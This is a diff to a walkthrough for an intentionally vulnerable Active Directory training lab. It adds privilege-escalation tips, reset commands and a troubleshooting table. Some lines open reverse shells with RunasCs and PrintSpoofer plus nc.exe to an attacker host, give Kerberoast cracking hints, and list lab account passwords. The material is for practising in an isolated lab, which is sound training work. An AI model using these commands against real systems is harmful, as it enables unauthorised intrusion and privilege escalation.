@@ -37,6 +37,8 @@ flowchart TD
 
 ### Credentials Reference
 
+These are the values in `scripts/LabSecrets.psd1`. If you change one there, update this table too.
+
 | Account | Password | How it's obtained | Role in lab |
 |---------|----------|-------------------|-------------|
 | `SBR\g.zeppeli` | `Ny0h0h0!Valkyrie` | LSA secret on SANDIEGO | First domain creds |
@@ -267,6 +269,12 @@ type C:\Users\svc_tusk\Desktop\local.txt
 
 ## 6. MONUMENTVALLEY: Privilege Escalation (`proof.txt`)
 
+> **Why winPEAS (and `Get-Service`) come up empty here.** evil-winrm gives you a *network* logon. On modern Windows Server, a non-admin network logon gets only `SC_MANAGER_CONNECT` on the Service Control Manager, not `SC_MANAGER_ENUMERATE_SERVICE`. So `Get-Service`, `sc.exe query` and winPEAS's service checks can't list services, and the vulnerable service never gets checked. Querying a service **by name** still works, because that depends on the service's own permissions, which grant svc_tusk access. This is intentional: manual enumeration beats blind automation. Ways around it:
+> - **Manual:** look in `C:\Program Files` (below), or list services from the registry, which network logons can read:
+>   `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* | ? { $_.ImagePath -and $_.ImagePath -notmatch 'system32|SysWOW64' } | select PSChildName, ImagePath`
+> - **PrivescCheck** (`. .\PrivescCheck.ps1; Invoke-PrivescCheck`) enumerates services from the registry and flags the weak permission.
+> - **Interactive logon:** `RunasCs.exe svc_tusk valkyrie cmd.exe -r 192.168.56.50:4446`, then run winPEAS from that shell.
+
 Look around `C:\Program Files`:
 
 ```powershell
@@ -405,16 +413,34 @@ type C:\Users\Administrator\Desktop\proof.txt
 
 ## Resetting After an Attempt
 
-The easiest reset is to revert all VMs to the `clean` snapshot. To repair in place instead:
+The easiest reset is to revert all VMs to the `clean` snapshot. To repair in place instead, run the following. On the member servers, log on as the **local** `.\Administrator` only; see [credential hygiene](SETUP.md#credential-hygiene).
 
 ```powershell
-# DC (as Domain Admin): remove d.brando from the group and strip DCSync rights
+# DC (as SBR\Administrator): remove d.brando from the group and strip the DCSync rights you added
 Remove-ADGroupMember 'Race Officials' -Members d.brando -Confirm:$false
-# (re-run DC01-2-Configure.ps1 is NOT enough to remove added ACEs; use dsacls or revert the snapshot)
+dsacls "DC=steelballrun,DC=local" /R "SBR\d.brando"
 
-# MS02: remove svc_tusk from Administrators, then re-run MS02-2-Configure.ps1 to restore the service
+# MS02 (as .\Administrator): undo the privesc and restore the original service binary path
 Remove-LocalGroupMember Administrators -Member 'SBR\svc_tusk'
+sc.exe config CorpseTracker binPath= "\"C:\Program Files\Steel Ball Run\Corpse Tracker\CorpseTracker.exe\""
+sc.exe start CorpseTracker
 
-# MS01: delete uploaded shells
+# MS01 (as .\Administrator): delete uploaded shells and dropped tools
 Remove-Item C:\inetpub\steelballrun\uploads\* -Force
+Remove-Item C:\Windows\Temp\nc.exe, C:\Windows\Temp\gp.exe -ErrorAction SilentlyContinue
 ```
+
+The setup folder is deleted after setup. To regenerate the flags in place instead of reverting, copy `scripts\` back to `C:\LabSetup` and re-run that machine's `*-2-Configure.ps1`. It's idempotent, and it deletes the folder and reboots again afterwards.
+
+---
+
+## Troubleshooting the Intended Path
+
+| Symptom | Cause / fix |
+|---------|-------------|
+| Kerberoast returns `$krb5tgs$18$` (AES) instead of `$23$` | Crack with `hashcat -m 19700`; it still cracks, just slower. `DC01-2-Configure.ps1` pins the roastable accounts to RC4 (`msDS-SupportedEncryptionTypes = 4`). Re-run it if that setting was changed. |
+| `valkyrie` doesn't crack | Check `grep -cx valkyrie /usr/share/wordlists/rockyou.txt` (should be ≥ 1) and that you cracked the **svc_tusk** hash, not svc_sql. |
+| `C:\RaceOps` files give "Access denied" even as admin | The lab was built with an old version of `MS02-2-Configure.ps1` that left the files with an empty DACL. As admin, run `icacls C:\RaceOps\* /reset`, or rebuild with the current script. |
+| `secretsdump` shows a cached `SBR/Administrator` logon, or mimikatz shows a DA hash on a member | A domain admin account was used on that member during setup. That's an unintended shortcut; see [credential hygiene](SETUP.md#credential-hygiene). |
+| svc_tusk's `local.txt` isn't on its Desktop | Setup couldn't pre-create the profile, so the flag is in `C:\Users\Public\Desktop\local.txt`, still readable only by svc_tusk. |
+| GodPotato fails | Try `GodPotato-NET4.exe` (not NET2/NET35), or PrintSpoofer: `PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.56.50 4445 -e cmd.exe"`. |
